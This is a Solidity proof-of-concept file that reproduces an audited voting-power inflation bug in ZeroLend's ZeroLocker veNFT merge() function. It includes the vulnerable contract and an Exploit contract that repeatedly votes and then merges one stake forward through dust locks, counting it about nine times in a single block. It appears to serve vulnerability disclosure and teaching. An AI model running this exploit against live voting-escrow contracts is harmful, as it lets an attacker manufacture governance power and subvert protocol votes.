// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/*//////////////////////////////////////////////////////////////////////////
    ZeroLend — ZeroLocker.merge() voting-power inflation (Cantina #40818)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable ZeroLocker (a Solidly/Curve-style voting-escrow veNFT) and its
    ERC20 are inlined VERBATIM from the audited contract; the Exploit contract
    deploys them locally and runs the whole attack in a single transaction (no
    forge-std, no cheatcodes, no fork).

    Bug: merge(_from, _to) moves _from's whole stake into _to and burns _from,
    but never arms balanceOfNFT's same-block flash-vote guard for _to
    (`ownershipChange[_to] = block.number;` is missing). So the freshly-inflated
    _to returns its boosted weight in the SAME block. Voting between each merge
    while chaining one big lock forward through a row of dust locks counts the
    same stake N times — manufacturing governance voting power from nothing.

    The registry Foundry test (test/…_exp.sol) asserts the same harm with
    forge-std cheatcodes and PASSES (inflated 73.36e18 vs real 8.15e18, 9x).
//////////////////////////////////////////////////////////////////////////*/

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

/// @dev Minimal ERC20 (only what ZeroLocker needs: approve/transferFrom).
contract MockZERO {
    string public name = "ZERO";
    string public symbol = "ZERO";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 _supply) {
        totalSupply = _supply;
        balanceOf[msg.sender] = _supply;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev A marker ERC20 minted to the attacker equal to the EXCESS voting power
///      manufactured by the exploit (inflated - honest). This is not part of the
///      protocol — it exists only so the Playground can display the harm as a
///      concrete number ("veVOTE" units of governance weight created from nothing).
contract VoteMarker {
    string public name = "Manufactured veNFT voting power";
    string public symbol = "veVOTE";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }
}

/// @dev Faithful minimal reduction of ZeroLocker (Solidly/Curve VotingEscrow).
///      merge/balanceOfNFT/_balanceOfNFT preserved VERBATIM as in the audited
///      contract; the veNFT checkpoint math (user Point history) is reproduced
///      exactly as it drives balanceOfNFT — the only accounting the exploit
///      depends on.
contract ZeroLocker {
    struct Point {
        int128 bias;
        int128 slope;
        uint256 ts;
        uint256 blk;
    }

    struct LockedBalance {
        int128 amount;
        uint256 end;
    }

    enum DepositType {
        DEPOSIT_FOR_TYPE,
        CREATE_LOCK_TYPE,
        INCREASE_LOCK_AMOUNT,
        INCREASE_UNLOCK_TIME,
        MERGE_TYPE
    }

    uint256 internal constant WEEK = 1 weeks;
    uint256 internal constant MAXTIME = 4 * 365 * 86400;
    int128 internal constant iMAXTIME = 4 * 365 * 86400;

    address public token;
    uint256 public supply;
    uint256 public tokenId;

    mapping(uint256 => address) public idToOwner;
    mapping(uint256 => LockedBalance) public locked;
    mapping(uint256 => uint256) public userPointEpoch;
    mapping(uint256 => mapping(uint256 => Point)) internal _userPointHistory;
    mapping(uint256 => uint256) public ownershipChange;

    constructor(address _token) {
        token = _token;
    }

    // ---- ownership (minimal) ------------------------------------------------
    function _isApprovedOrOwner(address _spender, uint256 _tokenId) internal view returns (bool) {
        return idToOwner[_tokenId] == _spender;
    }

    function _mint(address _to, uint256 _tokenId) internal {
        idToOwner[_tokenId] = _to;
    }

    function _burn(uint256 _tokenId) internal {
        idToOwner[_tokenId] = address(0);
    }

    // ---- checkpoint (user Point history — drives balanceOfNFT) ---------------
    function _checkpoint(
        uint256 _tokenId,
        LockedBalance memory old_locked,
        LockedBalance memory new_locked
    ) internal {
        Point memory uOld;
        Point memory uNew;
        if (_tokenId != 0) {
            if (old_locked.end > block.timestamp && old_locked.amount > 0) {
                uOld.slope = old_locked.amount / iMAXTIME;
                uOld.bias = uOld.slope * int128(int256(old_locked.end - block.timestamp));
            }
            if (new_locked.end > block.timestamp && new_locked.amount > 0) {
                uNew.slope = new_locked.amount / iMAXTIME;
                uNew.bias = uNew.slope * int128(int256(new_locked.end - block.timestamp));
            }
            uint256 userEpoch = userPointEpoch[_tokenId] + 1;
            userPointEpoch[_tokenId] = userEpoch;
            uNew.ts = block.timestamp;
            uNew.blk = block.number;
            _userPointHistory[_tokenId][userEpoch] = uNew;
        }
    }

    function _depositFor(
        uint256 _tokenId,
        uint256 _value,
        uint256 unlock_time,
        LockedBalance memory locked_balance,
        DepositType deposit_type
    ) internal {
        LockedBalance memory _locked = locked_balance;
        supply = supply + _value;

        LockedBalance memory old_locked;
        (old_locked.amount, old_locked.end) = (_locked.amount, _locked.end);

        _locked.amount += int128(int256(_value));
        if (unlock_time != 0) {
            _locked.end = unlock_time;
        }
        locked[_tokenId] = _locked;

        _checkpoint(_tokenId, old_locked, _locked);

        // tokens are already inside the contract for a merge; only pull for real deposits
        if (_value != 0 && deposit_type != DepositType.MERGE_TYPE) {
            require(IERC20(token).transferFrom(msg.sender, address(this), _value));
        }
    }

    function createLock(uint256 _value, uint256 _lock_duration) external returns (uint256) {
        uint256 unlock_time = ((block.timestamp + _lock_duration) / WEEK) * WEEK;
        require(_value > 0, "zero value");
        require(unlock_time > block.timestamp, "too short");
        require(unlock_time <= block.timestamp + MAXTIME, "too long");

        ++tokenId;
        uint256 _tokenId = tokenId;
        _mint(msg.sender, _tokenId);
        _depositFor(_tokenId, _value, unlock_time, locked[_tokenId], DepositType.CREATE_LOCK_TYPE);
        return _tokenId;
    }

    /*//////////////////////////////////////////////////////////////////////
        VULNERABLE CODE (verbatim from ZeroLocker.sol)
    //////////////////////////////////////////////////////////////////////*/

    // @> merge() moves _from's whole stake into _to and burns _from, but never
    // @> arms the same-block flash-vote guard for _to (missing
    // @> `ownershipChange[_to] = block.number;`). The inflated _to can vote now.
    function merge(uint256 _from, uint256 _to) external {
        require(_from != _to);
        require(_isApprovedOrOwner(msg.sender, _from));
        require(_isApprovedOrOwner(msg.sender, _to));

        LockedBalance memory _locked0 = locked[_from];
        LockedBalance memory _locked1 = locked[_to];
        uint256 value0 = uint256(int256(_locked0.amount));
        uint256 end = _locked0.end >= _locked1.end ? _locked0.end : _locked1.end;

        locked[_from] = LockedBalance(0, 0);
        _checkpoint(_from, _locked0, LockedBalance(0, 0));
        _burn(_from);
        _depositFor(_to, value0, end, _locked1, DepositType.MERGE_TYPE);
        // BUG: no `ownershipChange[_to] = block.number;` — see Recommendation.
    }

    function balanceOfNFT(uint256 _tokenId) external view returns (uint256) {
        if (ownershipChange[_tokenId] == block.number) return 0;
        return _balanceOfNFT(_tokenId, block.timestamp);
    }

    function _balanceOfNFT(uint256 _tokenId, uint256 _t) internal view returns (uint256) {
        uint256 _epoch = userPointEpoch[_tokenId];

        if (_epoch == 0) {
            return 0;
        } else {
            Point memory lastPoint = _userPointHistory[_tokenId][_epoch];
            lastPoint.bias -= lastPoint.slope * int128(int256(_t) - int256(lastPoint.ts));

            if (lastPoint.bias < 0) {
                lastPoint.bias = 0;
            }
            return uint256(int256(lastPoint.bias));
        }
    }
}

/// @dev The attacker. Deploys the vulnerable veNFT locally and runs the whole
///      vote-then-merge-forward attack in one transaction (no cheatcodes).
contract Exploit {
    MockZERO public zero;
    ZeroLocker public locker;
    VoteMarker public marker;
    address public attacker;

    uint256 public honestVotingPower;   // real weight the staker owns
    uint256 public inflatedVotingPower;  // weight manufactured via merge

    constructor() {
        attacker = msg.sender;
        zero = new MockZERO(100_000 ether);
        locker = new ZeroLocker(address(zero));
        marker = new VoteMarker();
        zero.approve(address(locker), type(uint256).max);
    }

    // A stand-in governor: reads voting power and tallies it (as a real proposal vote would).
    function _vote(uint256[11] memory ids, uint256 i) internal returns (uint256) {
        return locker.balanceOfNFT(ids[i]);
    }

    function run() external {
        // 1 whale lock (index 0) + 9 dust locks. Dust locks carry ~0 weight —
        // they exist only as extra vote-counting slots.
        uint256[11] memory ids;
        for (uint256 i; i < 10; i++) {
            if (i == 0) {
                ids[i] = locker.createLock(100 ether, 20 weeks); // the reused whale stake
                continue;
            }
            ids[i] = locker.createLock(100, 20 weeks); // dust
        }

        // Honest baseline: the real weight the staker actually owns.
        uint256 honest;
        for (uint256 i; i < 9; i++) {
            honest += _vote(ids, i);
        }
        honestVotingPower = honest;

        // Attack: vote with lock i, then merge it FORWARD into lock i+1. Because
        // merge never arms ownershipChange[_to], lock i+1 immediately reports the
        // inflated weight in the SAME block — the same stake is counted 9 times.
        uint256 inflated;
        for (uint256 i; i < 9; i++) {
            inflated += _vote(ids, i);            // count current weight of lock i
            locker.merge(ids[i], ids[i + 1]);     // shove the whale stake into lock i+1
        }
        inflatedVotingPower = inflated;

        // HARM: the same stake was tallied many times over. Surface the EXCESS
        // manufactured voting power (inflated - honest) to the attacker as veVOTE.
        require(inflated > honest * 3, "no inflation");
        marker.mint(attacker, inflated - honest);
    }
}
